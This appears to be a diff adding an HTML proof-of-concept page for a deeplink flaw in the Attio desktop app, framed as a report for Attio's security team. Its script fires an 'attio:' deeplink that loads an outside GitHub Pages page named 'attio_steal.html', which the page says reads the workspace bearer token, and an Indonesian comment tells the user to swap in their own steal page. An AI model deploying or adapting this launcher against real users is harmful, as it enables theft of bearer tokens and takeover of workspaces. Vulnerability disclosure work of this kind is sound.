@@ -1,0 +1,14 @@
+
+<!doctype html><meta charset=utf-8><title>Deeplink PoC</title>
+<body style="font:16px/1.6 -apple-system,system-ui;background:#f6f7f9;color:#1a1a2e;margin:0;display:grid;place-items:center;height:100vh">
+<div style="background:#fff;max-width:470px;padding:40px;border-radius:14px;box-shadow:0 10px 40px #0002">
+  <div style="font-size:18px;font-weight:700;margin-bottom:8px">Attio Desktop — deeplink PoC</div>
+  <div style="color:#555;margin-bottom:22px">Clicking below fires an <code>attio:</code> deeplink that loads this origin into the Attio desktop content window and reads the workspace bearer token. Security proof-of-concept for the Attio security team.</div>
+  <button id=go style="background:#111;color:#fff;border:0;padding:13px 26px;border-radius:9px;font-size:15px;font-weight:600;cursor:pointer">Trigger deeplink</button>
+</div>
+<script>
+// === GANTI dengan URL GitHub Pages kamu (HTTPS, harus ke steal.html) ===
+const DEEPLINK = "attio:https://ajaone.github.io/testing-repository/attio_steal.html";
+// contoh: "attio:https://33x.github.io/attio-deeplink-poc/steal.html"
+document.getElementById('go').onclick = () => { location.href = DEEPLINK; };
+</script>
